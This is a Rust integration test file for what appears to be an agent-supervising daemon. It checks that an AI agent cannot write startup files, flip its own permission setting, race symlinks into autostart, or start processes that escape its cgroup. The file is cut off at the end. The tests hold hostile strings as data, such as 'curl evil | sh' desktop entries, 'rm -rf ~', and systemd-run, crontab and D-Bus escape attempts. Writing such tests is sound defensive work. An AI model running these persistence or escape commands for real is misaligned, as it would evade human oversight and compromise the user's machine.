    std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
    exe
}

/// Aprova pelo executável dado, sem terminal de controle (setsid), e devolve a mensagem.
fn approve_with(exe: &Path, sock: &Path) -> String {
    let mut c = Client::new(sock);
    let (_, list) = loop {
        let r = c.rpc("kalango/aguardar", json!({"max_s": 5}))["result"].clone();
        if !r["pendentes"].as_array().unwrap().is_empty() {
            break (r["geracao"].clone(), r["pendentes"].clone());
        }
    };
    let id = list[0]["id"].as_u64().unwrap();
    let out = Command::new("setsid").arg("-w").arg(exe).args(["aprovar", &id.to_string()]).env("KALANGOD_SOCKET", sock)
        .stdin(std::process::Stdio::null()).output().unwrap();
    String::from_utf8_lossy(&out.stdout).into_owned() + &String::from_utf8_lossy(&out.stderr)
}

#[test]
fn aprovador_grafico_confiavel() {
    let tmp = tempfile::tempdir().unwrap();
    let trusted = trusted_copy(tmp.path());
    let t = trusted.display().to_string();
    let d = start_cfg(move |c| c.replace("approval_requires_tty = false", &format!("approval_requires_tty = true\naprovadores_graficos = [\"{t}\"]")));
    let mut c = Client::new(&d.sock);

    // sem terminal e não confiável: recusado
    let sock = d.sock.clone();
    let h = std::thread::spawn(move || approve_with(Path::new(BIN), &sock));
    let sock2 = d.sock.clone();
    let r = std::thread::spawn(move || Client::new(&sock2).call("pacotes.instalar", json!({"nomes": ["cowsay"]})));
    let msg = h.join().unwrap();
    assert!(msg.contains("presencial"), "executável não confiável devia ser recusado: {msg}");
    // o pedido continua esperando: agora o aprovador confiável decide
    let msg = approve_with(&trusted, &d.sock);
    assert!(msg.contains("aprovado"), "{msg}");
    let r = r.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");

    // a lista entregue à tela traz o que ela precisa mostrar
    // (waits from the current generation: earlier requests in this daemon already moved it past 0)
    let geracao = c.rpc("kalango/aguardar", json!({}))["result"]["geracao"].as_u64().unwrap();
    let sock = d.sock.clone();
    let w = std::thread::spawn(move || Client::new(&sock).rpc("kalango/aguardar", json!({"geracao": geracao, "max_s": 10}))["result"].clone());
    let h = std::thread::spawn({ let s = d.sock.clone(); let t = trusted.clone(); move || approve_with(&t, &s) });
    let _ = c.call("servicos.acao", json!({"nome": "cron.service", "acao": "parar"}));
    h.join().unwrap();
    let got = w.join().unwrap();
    let p = &got["pendentes"][0];
    for k in ["descricao", "efeito", "reversivel", "prazo_s", "caller", "args", "level"] {
        assert!(!p[k].is_null(), "falta {k}: {got}");
    }
    assert_eq!(p["efeito"], "escreve");
    assert_eq!(p["reversivel"], true);

    // um executável confiável mas que outros podem alterar deixa de ser confiável
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&trusted, std::fs::Permissions::from_mode(0o777)).unwrap();
    let sock = d.sock.clone();
    let r = std::thread::spawn(move || Client::new(&sock).call("pacotes.instalar", json!({"nomes": ["cowsay"]})));
    let msg = approve_with(&trusted, &d.sock);
    assert!(msg.contains("presencial"), "arquivo gravável por todos não pode aprovar: {msg}");
    std::fs::set_permissions(&trusted, std::fs::Permissions::from_mode(0o755)).unwrap();
    approve_with(&trusted, &d.sock);
    r.join().unwrap();
}

/// Settings › Network › "Permitir agentes usarem esta rede": on a network the person keeps the agents off, `web.ler`
/// refuses (and says which network); allowed again, the network no longer stops it.
#[test]
fn rede_sem_agentes_bloqueia_o_web_ler() {
    let dir = tempfile::tempdir().unwrap();
    let nmcli = dir.path().join("nmcli");
    std::fs::write(&nmcli, "#!/bin/sh\necho 'Celular de Ana'\n").unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&nmcli, std::fs::Permissions::from_mode(0o755)).unwrap();
    let d = start_full_env(true, "", |c| c, &[("KALANGO_NMCLI", nmcli.to_str().unwrap())]);
    let mut c = Client::new(&d.sock);
    assert_eq!(c.rpc("kalango/redes_agentes", json!({}))["result"]["sem_agentes"], json!([]));
    let r = c.rpc("kalango/redes_agentes", json!({"rede": "Celular de Ana", "permitir": false}));
    assert_eq!(r["result"]["sem_agentes"], json!(["Celular de Ana"]));
    let w = c.call("web.ler", json!({"url": "https://exemplo.invalid/"}));
    assert_eq!(w["isError"], true, "{w}");
    assert!(w["content"][0]["text"].as_str().unwrap().contains("Celular de Ana"), "{w}");
    c.rpc("kalango/redes_agentes", json!({"rede": "Celular de Ana", "permitir": true}));
    let w = c.call("web.ler", json!({"url": "https://exemplo.invalid/"}));
    // (the address does not exist: it still fails, but not because of the network)
    assert!(!w["content"][0]["text"].as_str().unwrap_or("").contains("Celular de Ana"), "{w}");
}

/// A daemon whose startup files (startup.rs) and settings file are in the test's area: `.bashrc` and
/// `.config/autostart` there, the person's choice in `cfg/kalango/agente-permissoes.json` (protected, as
/// `~/.config/kalango` is).
fn start_startup() -> Daemon {
    start_startup_env(&[])
}

fn start_startup_env(env: &[(&str, &str)]) -> Daemon {
    start_in(Some(Path::new(env!("CARGO_TARGET_TMPDIR"))), true, "", |cfg| {
        let area = cfg.split("allowed_paths = [\"").nth(1).unwrap().split('"').next().unwrap().to_string();
        cfg.replace("/segredo\"]", &format!("/segredo\", \"{area}/cfg/kalango\"]")).replace("[[callers]]", &format!(
            "startup_paths = [\"{area}/.bashrc\", \"{area}/.config/autostart\"]\nstartup_setting = \"{area}/cfg/kalango/agente-permissoes.json\"\nhome = \"{area}\"\nlogin_path = \"/usr/local/bin:/usr/bin:{area}/meus-programas\"\n[[callers]]"))
    }, env)
}

/// Waits for the next request and answers it from another process: first "always" (which must be refused for a
/// startup file), then `decision` ("aprovar" or "negar"). Returns the request as the approval screen sees it and
/// what the "always" attempt said.
fn answer_startup(sock: PathBuf, decision: &'static str) -> std::thread::JoinHandle<(Value, String)> {
    std::thread::spawn(move || {
        for _ in 0..400 {
            let mut c = Client::new(&sock);
            let p = c.rpc("kalango/pendentes", json!({}));
            if let Some(req) = p["result"].as_array().and_then(|a| a.first()).cloned() {
                let id = req["id"].as_u64().unwrap().to_string();
                let always = Command::new(BIN).args(["aprovar", &id, "--sempre"]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                let always = String::from_utf8_lossy(&always.stdout).into_owned() + &String::from_utf8_lossy(&always.stderr);
                Command::new(BIN).args([decision, &id]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                return (req, always);
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        (Value::Null, "nenhum pedido".into())
    })
}

#[test]
fn startup_files_ask_with_the_diff_and_never_always() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let bashrc = d.area.join(".bashrc");
    std::fs::write(&bashrc, "# aliases\nalias la='ls -A'\n").unwrap();
    let novo = "# aliases\nalias la='ls -A'\nalias ll='ls -alF'\n";
    // the agents' engine asks kalangod whether it will ask (so it does not ask in the conversation too)
    let q = c.rpc("kalango/inicio", json!({"ferramenta": "arquivos.escrever", "argumentos": {"caminho": bashrc, "conteudo": novo}}));
    assert_eq!(q["result"]["pede"], true, "{q}");
    assert_eq!(c.rpc("kalango/inicio", json!({"ferramenta": "arquivos.escrever", "argumentos": {"caminho": d.area.join("notas.md"), "conteudo": "x"}}))["result"]["pede"], false);
    // asked, with the exact diff, and "always" refused
    // ("~" is the test's home here: kalangod's `home`, as in a test session)
    let h = answer_startup(d.sock.clone(), "aprovar");
    let r = c.call("arquivos.escrever", json!({"caminho": "~/.bashrc", "conteudo": novo}));
    let (req, always) = h.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");
    assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), novo);
    assert_eq!(req["level"], "inicio", "{req}");
    assert_eq!(req["no_always"], true);
    let linhas = req["startup"]["linhas"].as_array().unwrap();
    assert_eq!(linhas.iter().filter(|l| l["t"] != " ").collect::<Vec<_>>(), vec![&json!({"t": "+", "l": "alias ll='ls -alF'"})], "{req}");
    assert!(req["startup"]["arquivos"][0].as_str().unwrap().ends_with(".bashrc"));
    assert!(!always.contains("aprovado"), "“always” must be refused for a startup file: {always}");
    // the timeline marks it, with undo
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    let last = regs.iter().rev().find(|e| e["tool"] == "arquivos.escrever").unwrap();
    assert_eq!(last["startup"]["automatico"], false, "{last}");
    assert!(last["inverse"].is_object());
    // the same change again: asked again (no "always" was kept); denied, nothing changes
    let h = answer_startup(d.sock.clone(), "negar");
    let r = c.call("arquivos.escrever", json!({"caminho": bashrc, "conteudo": "rm -rf ~\n"}));
    h.join().unwrap();
    assert_eq!(r["isError"], true, "{r}");
    assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), novo);
    // around the corner: `..`, a link (also to a file not created yet), moving a file into autostart
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    std::os::unix::fs::symlink(&bashrc, d.area.join("docs/notas.txt")).unwrap();
    std::fs::create_dir_all(d.area.join(".config/autostart")).unwrap();
    std::os::unix::fs::symlink(d.area.join(".config/autostart/x.desktop"), d.area.join("docs/novo.desktop")).unwrap();
    std::fs::write(d.area.join("docs/y.desktop"), "[Desktop Entry]\nExec=sh\n").unwrap();
    for (tool, args) in [
        ("arquivos.escrever", json!({"caminho": d.area.join("docs/../.bashrc"), "conteudo": "x"})),
        ("arquivos.escrever", json!({"caminho": d.area.join("docs/notas.txt"), "conteudo": "x"})),
        ("arquivos.escrever", json!({"caminho": d.area.join("docs/novo.desktop"), "conteudo": "[Desktop Entry]\nExec=sh\n"})),
        ("arquivos.mover", json!({"de": d.area.join("docs/y.desktop"), "para": d.area.join(".config/autostart")})),
        ("arquivos.lixeira", json!({"caminho": bashrc})),
    ] {
        let h = answer_startup(d.sock.clone(), "negar");
        let r = c.call(tool, args.clone());
        let (req, _) = h.join().unwrap();
        assert_eq!(req["level"], "inicio", "{tool} {args} should ask: {req}");
        assert_eq!(r["isError"], true, "{r}");
    }
    assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), novo);
    assert!(!d.area.join(".config/autostart/x.desktop").exists() && !d.area.join(".config/autostart/y.desktop").exists());
}

#[test]
fn an_agent_cannot_flip_the_startup_setting() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let setting = d.area.join("cfg/kalango/agente-permissoes.json");
    std::fs::create_dir_all(setting.parent().unwrap()).unwrap();
    std::fs::write(&setting, r#"{"categorias": {}}"#).unwrap();
    let livre = r#"{"arquivos_de_inicio": "livre"}"#;
    // not with the file tools (protected), not through `..` or a link, not with a command
    for args in [json!({"caminho": setting, "conteudo": livre}), json!({"caminho": d.area.join("x/../cfg/kalango/agente-permissoes.json"), "conteudo": livre})] {
        assert_eq!(c.call("arquivos.escrever", args)["isError"], true);
    }
    std::os::unix::fs::symlink(&setting, d.area.join("p.json")).unwrap();
    assert_eq!(c.call("arquivos.escrever", json!({"caminho": d.area.join("p.json"), "conteudo": livre}))["isError"], true);
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", format!("echo '{livre}' > {}", setting.display())], "pasta": d.area}));
    assert_ne!(r["structuredContent"]["codigo"], 0, "a command must not write the setting: {r}");
    assert_eq!(std::fs::read_to_string(&setting).unwrap(), r#"{"categorias": {}}"#);
    // the request's own words change nothing either: it still asks
    let h = answer_startup(d.sock.clone(), "negar");
    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join(".bashrc"), "conteudo": "x", "arquivos_de_inicio": "livre"}));
    let (req, _) = h.join().unwrap();
    assert!(req["level"] == "inicio" || r["isError"] == true, "{r} {req}");
    assert!(!d.area.join(".bashrc").exists());
}

#[test]
fn commands_cannot_write_startup_files_unless_the_person_lets_them() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let bashrc = d.area.join(".bashrc");
    std::fs::write(&bashrc, "alias la='ls -A'\n").unwrap();
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    let sh = |c: &mut Client, script: &str| c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", script], "pasta": d.area.join("docs")}));
    // "ask" (the default): Landlock keeps commands off them (the agent uses the file tools, which ask)
    for script in ["echo evil >> ../.bashrc", "printf x > ../.bashrc.tmp && mv ../.bashrc.tmp ../.bashrc", "rm -f ../.bashrc",
        "mkdir -p ../.config/autostart && echo x > ../.config/autostart/a.desktop"] {
        sh(&mut c, script);
    }
    assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), "alias la='ls -A'\n");
    assert!(!d.area.join(".config/autostart/a.desktop").exists());
    // the rest still works: inside a folder, reading the home, and changing a file already at its top level
    std::fs::write(d.area.join("notas.txt"), "a").unwrap();
    let r = sh(&mut c, "echo ok > ok.txt && cat ../.bashrc && echo b >> ../notas.txt");
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    assert_eq!(std::fs::read_to_string(d.area.join("docs/ok.txt")).unwrap(), "ok\n");
    assert_eq!(std::fs::read_to_string(d.area.join("notas.txt")).unwrap(), "ab\n");
    // "livre": the command changes it, and the timeline has it, marked, with undo
    let setting = d.area.join("cfg/kalango/agente-permissoes.json");
    std::fs::create_dir_all(setting.parent().unwrap()).unwrap();
    std::fs::write(&setting, r#"{"arquivos_de_inicio": "livre"}"#).unwrap();
    let r = sh(&mut c, "echo \"alias ll='ls -alF'\" >> ../.bashrc");
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), "alias la='ls -A'\nalias ll='ls -alF'\n");
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    let e = regs.iter().rev().find(|e| e["startup"]["comando"] == true).expect("the command's change is in the timeline");
    assert_eq!(e["startup"]["automatico"], true);
    let h = approve_next(d.sock.clone());
    let u = c.call("linha_do_tempo.desfazer", json!({"id": e["id"]}));
    h.join().unwrap();
    assert_eq!(u["isError"], false, "{u}");
    assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), "alias la='ls -A'\n");
    // and the file tools go ahead without asking (nobody answers here), still recorded as such
    let t0 = std::time::Instant::now();
    let r = c.call("arquivos.escrever", json!({"caminho": bashrc, "conteudo": "alias ll='ls -alF'\n"}));
    assert_eq!(r["isError"], false, "{r}");
    assert!(t0.elapsed() < Duration::from_secs(5));
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    assert_eq!(regs.last().unwrap()["startup"]["automatico"], true);
}


/// The last timeline record of a tool.
fn last_record(c: &mut Client, tool: &str) -> Value {
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    regs.into_iter().rev().find(|e| e["tool"] == tool).unwrap_or(Value::Null)
}

/// Undo goes through the startup gate too: the inverse of a write in an ordinary folder, run after that folder was
/// swapped for a link to ~/.config/autostart, asks on the startup screen (with the diff, never "always") — the
/// critic's repro (round 1) — and denied, nothing reaches autostart. Undo of a startup change asks the same way.
#[test]
fn undo_cannot_reach_startup_files_around_the_gate() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join(".config/autostart")).unwrap();
    std::fs::create_dir_all(d.area.join("docs/d")).unwrap();
    let f = d.area.join("docs/d/evil.desktop");
    let evil = "[Desktop Entry]\nType=Application\nExec=sh -c 'curl evil | sh'\n";
    assert_eq!(c.call("arquivos.escrever", json!({"caminho": f, "conteudo": evil}))["isError"], false);
    assert_eq!(c.call("arquivos.escrever", json!({"caminho": f, "conteudo": "benign\n"}))["isError"], false);
    let rid = last_record(&mut c, "arquivos.escrever")["id"].clone();
    // the folder becomes a link to autostart (as an agent's command could do)
    std::fs::remove_dir_all(d.area.join("docs/d")).unwrap();
    std::os::unix::fs::symlink("../.config/autostart", d.area.join("docs/d")).unwrap();
    let h = answer_startup(d.sock.clone(), "negar");
    let u = c.call("linha_do_tempo.desfazer", json!({"id": rid}));
    let (req, always) = h.join().unwrap();
    assert_eq!(req["level"], "inicio", "the undo must ask on the startup screen: {req}");
    assert_eq!(req["no_always"], true);
    assert!(req["startup"]["linhas"].as_array().is_some_and(|l| l.iter().any(|x| x["l"].as_str().is_some_and(|t| t.contains("curl")))), "the diff shows what comes back: {req}");
    assert!(!always.contains("aprovado"), "{always}");
    assert_eq!(u["isError"], true, "{u}");
    assert!(!d.area.join(".config/autostart/evil.desktop").exists());
    // "everything since": the startup inverse asks too (denied: it is listed as failed, nothing written)
    let t0 = last_record(&mut c, "arquivos.escrever")["time"].as_u64().unwrap();
    let h1 = approve_next(d.sock.clone());
    let h2 = std::thread::spawn({ let s = d.sock.clone(); move || { std::thread::sleep(Duration::from_millis(300)); answer_startup(s, "negar").join().unwrap() } });
    let u = c.call("linha_do_tempo.desfazer_desde", json!({"desde": t0}));
    h1.join().unwrap();
    let (req, _) = h2.join().unwrap();
    assert_eq!(req["level"], "inicio", "{req}");
    assert!(u["structuredContent"]["falhas"].as_array().is_some_and(|f| !f.is_empty()), "{u}");
    assert!(!d.area.join(".config/autostart/evil.desktop").exists());
    // undo of an approved .bashrc change: asked on the startup screen (no generic "system change" before it)
    std::fs::write(d.area.join(".bashrc"), "alias la='ls -A'\n").unwrap();
    let h = answer_startup(d.sock.clone(), "aprovar");
    assert_eq!(c.call("arquivos.escrever", json!({"caminho": "~/.bashrc", "conteudo": "alias la='ls -A'\nalias ll='ls -l'\n"}))["isError"], false);
    h.join().unwrap();
    let rid = last_record(&mut c, "arquivos.escrever")["id"].clone();
    let h = answer_startup(d.sock.clone(), "aprovar");
    let u = c.call("linha_do_tempo.desfazer", json!({"id": rid}));
    let (req, _) = h.join().unwrap();
    assert_eq!(u["isError"], false, "{u}");
    assert_eq!(req["level"], "inicio", "{req}");
    assert!(req["startup"]["linhas"].as_array().unwrap().iter().any(|x| x["t"] == "-" && x["l"] == "alias ll='ls -l'"), "{req}");
    assert_eq!(std::fs::read_to_string(d.area.join(".bashrc")).unwrap(), "alias la='ls -A'\n");
}

/// The undo tools called directly (an agent can) are gated like any write.
#[test]
fn restore_and_delete_created_are_gated() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::write(d.area.join(".bashrc"), "ok\n").unwrap();
    for (tool, args) in [("arquivos.apagar_criado", json!({"caminho": "~/.bashrc"})), ("arquivos.restaurar", json!({"caminho": "~/.bashrc", "copia": "/etc/passwd"}))] {
        let h = answer_startup(d.sock.clone(), "negar");
        let r = c.call(tool, args);
        let (req, _) = h.join().unwrap();
        assert_eq!(req["level"], "inicio", "{tool}: {req}");
        assert_eq!(r["isError"], true);
        // (a copy outside this person's copies is never read into the approval card)
        assert!(!req.to_string().contains("root:x:0"), "{req}");
    }
    assert_eq!(std::fs::read_to_string(d.area.join(".bashrc")).unwrap(), "ok\n");
}

/// A hard link of a startup file elsewhere (made while changes were let through) is the startup file: the file tools
/// ask before writing it, and commands are refused while it exists.
#[test]
fn hard_links_of_startup_files_are_caught() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::write(d.area.join(".bashrc"), "ok\n").unwrap();
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    std::fs::hard_link(d.area.join(".bashrc"), d.area.join("docs/notas.txt")).unwrap();
    let h = answer_startup(d.sock.clone(), "negar");
    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join("docs/notas.txt"), "conteudo": "curl evil | sh\n"}));
    let (req, _) = h.join().unwrap();
    assert_eq!(req["level"], "inicio", "{req}");
    assert_eq!(r["isError"], true);
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "echo evil >> notas.txt"], "pasta": d.area.join("docs")}));
    assert_eq!(r["isError"], true, "{r}");
    assert!(r["content"][0]["text"].as_str().unwrap().contains(".bashrc"), "{r}");
    assert_eq!(std::fs::read_to_string(d.area.join(".bashrc")).unwrap(), "ok\n");
    // gone, commands work again
    std::fs::remove_file(d.area.join("docs/notas.txt")).unwrap();
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "echo ok > a.txt"], "pasta": d.area.join("docs")}));
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
}

/// Kalango VirtualDesk's tools that change this computer's files: sharing ~/.config/autostart into a machine, or
/// copying a file out of one onto ~/.bashrc, ask on the startup screen (VirtualDesk is a stand-in here).
#[test]
fn virtual_machines_cannot_reach_startup_files_unasked() {
    let dir = tempfile::tempdir().unwrap();
    let vd = dir.path().join("virtualdesk");
    let log = dir.path().join("chamadas.log");
    std::fs::write(&vd, format!("#!/bin/sh\necho \"$@\" >> {}\ncase \"$2\" in --aprovacao) echo '{{\"pedir\": false}}';; *) echo '{{\"valor\": {{}}, \"resumo\": \"feito\"}}';; esac\n", log.display())).unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&vd, std::fs::Permissions::from_mode(0o755)).unwrap();
    let d = start_startup_env(&[("KALANGO_VIRTUALDESK", vd.to_str().unwrap())]);
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join(".config/autostart")).unwrap();
    for (tool, args) in [("vm.pastas", json!({"maquina": "ana", "caminho": "~/.config/autostart", "acao": "adicionar"})),
                         ("vm.copiar_arquivo", json!({"maquina": "ana", "sentido": "da_maquina", "de": "/tmp/x", "para": "~/.bashrc"}))] {
        let h = answer_startup(d.sock.clone(), "negar");
        let r = c.call(tool, args);
        let (req, _) = h.join().unwrap();
        assert_eq!(req["level"], "inicio", "{tool}: {req}");
        assert_eq!(r["isError"], true, "{r}");
    }
    let calls = std::fs::read_to_string(&log).unwrap_or_default();
    assert!(!calls.lines().any(|l| l.contains("ferramenta vm.pastas {") || l.contains("ferramenta vm.copiar_arquivo {")), "denied: VirtualDesk never ran them: {calls}");
    // an ordinary folder goes ahead (VirtualDesk asks nothing in this stand-in)
    std::fs::create_dir_all(d.area.join("Projetos")).unwrap();
    let r = c.call("vm.pastas", json!({"maquina": "ana", "caminho": "~/Projetos", "acao": "adicionar"}));
    assert_eq!(r["isError"], false, "{r}");
}


/// Denies every request that appears, from another process, until `stop`; returns how many it denied.
fn deny_all(sock: PathBuf, stop: std::sync::Arc<std::sync::atomic::AtomicBool>) -> std::thread::JoinHandle<usize> {
    std::thread::spawn(move || {
        let mut n = 0;
        while !stop.load(std::sync::atomic::Ordering::Relaxed) {
            let p = Client::new(&sock).rpc("kalango/pendentes", json!({}));
            for r in p["result"].as_array().cloned().unwrap_or_default() {
                Command::new(BIN).args(["negar", &r["id"].as_u64().unwrap_or(0).to_string()]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                n += 1;
            }
            std::thread::sleep(Duration::from_millis(5));
        }
        n
    })
}

/// Round 2's race: while another thread keeps exchanging ~/docs/d (a folder) with a link to ~/.config/autostart
/// (renameat2 RENAME_EXCHANGE, as fast as it can), an agent writes files and moves them into ~/docs/d. Whatever the
/// interleaving, nothing lands in autostart: a call that sees the link asks (denied here), one that saw the folder
/// works from its descriptor, and the helper never follows the link.
#[test]
fn moving_into_a_folder_raced_into_a_link_never_lands_in_autostart() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let auto = d.area.join(".config/autostart");
    std::fs::create_dir_all(&auto).unwrap();
    std::fs::create_dir_all(d.area.join("docs/d")).unwrap();
    std::os::unix::fs::symlink("../.config/autostart", d.area.join("docs/link")).unwrap();
    let stop = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let swaps = std::thread::spawn({
        let (docs, stop) = (d.area.join("docs"), stop.clone());
        move || {
            let mut n = 0u64;
            while !stop.load(std::sync::atomic::Ordering::Relaxed) {
                let _ = nix::fcntl::renameat2(None, &docs.join("d"), None, &docs.join("link"), nix::fcntl::RenameFlags::RENAME_EXCHANGE);
                n += 1;
            }
            n
        }
    });
    let denier = deny_all(d.sock.clone(), stop.clone());
    let n = 1500;
    for i in 0..n {
        let f = d.area.join(format!("e{i}.desktop"));
        c.call("arquivos.escrever", json!({"caminho": f, "conteudo": "[Desktop Entry]\nExec=evil\n"}));
        c.call("arquivos.mover", json!({"de": f, "para": d.area.join(format!("docs/d/e{i}.desktop"))}));
    }
    stop.store(true, std::sync::atomic::Ordering::Relaxed);
    let (swaps, denied) = (swaps.join().unwrap(), denier.join().unwrap());
    let landed: Vec<_> = std::fs::read_dir(&auto).unwrap().flatten().map(|e| e.file_name()).collect();
    eprintln!("{n} moves against {swaps} swaps; {denied} asked and denied");
    assert!(swaps > 1000, "the swapper must really race: {swaps}");
    assert!(landed.is_empty(), "files landed in autostart: {landed:?}");
}

/// Nothing an agent's command starts outlives it: a detached `setsid` child is killed with the task's cgroup.
#[test]
fn a_task_leaves_nothing_running() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "setsid sh -c 'echo $$ > fica.pid; exec sleep 60' < /dev/null > /dev/null 2>&1 & sleep 0.3"], "pasta": d.area.join("docs")}));
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    let pid: i32 = std::fs::read_to_string(d.area.join("docs/fica.pid")).unwrap().trim().parse().unwrap();
    let mut alive = true;
    for _ in 0..40 {
        alive = std::path::Path::new(&format!("/proc/{pid}")).exists()
            && !std::fs::read_to_string(format!("/proc/{pid}/stat")).unwrap_or_default().contains(") Z ");
        if !alive {
            break;
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    assert!(!alive, "the detached child {pid} survived the task");
}

/// The person's login PATH: a folder of it inside the home is a startup path (a program there under a common name runs
/// at the next use); a hard link to a file deep in a startup folder — or any file with another name — asks too.
#[test]
fn login_path_folders_and_any_hard_link_ask() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join("meus-programas")).unwrap();
    let h = answer_startup(d.sock.clone(), "negar");
    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join("meus-programas/ls"), "conteudo": "#!/bin/sh\nevil\n"}));
    let (req, _) = h.join().unwrap();
    assert_eq!(req["level"], "inicio", "{req}");
    assert_eq!(r["isError"], true);
    assert!(!d.area.join("meus-programas/ls").exists());
    let deep = d.area.join(".config/autostart/a/b/c/d/e/f/g/h");
    std::fs::create_dir_all(&deep).unwrap();
    std::fs::write(deep.join("x.desktop"), "ok\n").unwrap();
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    std::fs::hard_link(deep.join("x.desktop"), d.area.join("docs/x.txt")).unwrap();
    let h = answer_startup(d.sock.clone(), "negar");
    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join("docs/x.txt"), "conteudo": "evil\n"}));
    let (req, _) = h.join().unwrap();
    assert_eq!(req["level"], "inicio", "{req}");
    assert_eq!(req["startup"]["outro_nome"], true, "{req}");
    assert_eq!(r["isError"], true);
    assert_eq!(std::fs::read_to_string(deep.join("x.desktop")).unwrap(), "ok\n");
}


/// An agent's command cannot have anything started outside its own cgroup (where it would outlive the task):
/// - no local sockets (seccomp refuses socket(AF_UNIX)): no `systemd-run --user`, no `systemctl --user start`, no
///   D-Bus (activation of a user service on the session bus), no systemd private socket;
/// - setgid programs do not elevate (no_new_privs, set by Landlock): `crontab` cannot reach the cron spool (`at` the
///   same, where installed);
/// - /sys is read-only: it cannot move itself into another cgroup.
///
/// A pipe between a process and its children (socketpair) and network sockets still work.
#[test]
fn a_command_cannot_start_anything_outside_its_cgroup() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    let unit = format!("kalango-fuga-teste-{}", std::process::id());
    let cg = std::fs::read_to_string("/proc/self/cgroup").unwrap().lines().find_map(|l| l.strip_prefix("0::").map(str::to_string)).unwrap();
    let script = format!(
        "systemd-run --user --unit={unit} sleep 300 2>&1; echo systemd-run=$?; \
         systemctl --user start {unit}.service 2>&1; echo systemctl=$?; \
         python3 -c 'import socket,os; s=socket.socket(socket.AF_UNIX); s.connect(os.environ.get(\"XDG_RUNTIME_DIR\",\"/run/user/0\")+\"/bus\")' 2>&1 | tail -1; \
         crontab -l 2>&1; echo crontab=$?; \
         echo $$ > /sys/fs/cgroup{cg}/cgroup.procs 2>&1; echo cgroup=$?; \
         python3 -c 'import socket; a,b=socket.socketpair(); print(\"socketpair\", bool(a))'; \
         python3 -c 'import socket; socket.socket(socket.AF_INET); print(\"inet ok\")'");
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", script], "pasta": d.area.join("docs")}));
    let out = r["structuredContent"]["saida"].as_str().unwrap_or("").to_string();
    let active = Command::new("systemctl").args(["--user", "is-active", &format!("{unit}.service")]).output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default();
    let _ = Command::new("systemctl").args(["--user", "stop", &format!("{unit}.service")]).output();
    assert_ne!(active, "active", "a transient unit escaped: {out}");
    assert!(!out.contains("systemd-run=0"), "{out}");
    assert!(out.contains("Operation not permitted") || out.contains("PermissionError"), "{out}");
    assert!(!out.contains("crontab=0") || out.contains("no crontab"), "{out}");
    assert!(!out.contains("cgroup=0"), "{out}");
    assert!(out.contains("socketpair True") && out.contains("inet ok"), "{out}");
}


/// VirtualDesk copying a file out of a machine writes it into a staging file no agent reaches; kalangod then puts it
/// in place without following links: a folder of the destination turned into a link to autostart meanwhile (the
/// stand-in does it while "copying") stops it, nothing lands there.
#[test]
fn a_copy_out_of_a_machine_never_follows_a_link_put_on_the_way() {
    let dir = tempfile::tempdir().unwrap();
    let vd = dir.path().join("virtualdesk");
    let swap = dir.path().join("trocar.txt");
    std::fs::write(&vd, format!(r#"#!/usr/bin/python3
import json, os, sys
a = sys.argv[1:]
if a[1] == "--aprovacao":
    print(json.dumps({{"pedir": False}})); sys.exit()
args = json.loads(a[2])
if a[1] == "vm.copiar_arquivo":
    open(args["para"], "w").write("[Desktop Entry]\nExec=evil\n")
    if os.path.exists("{swap}"):
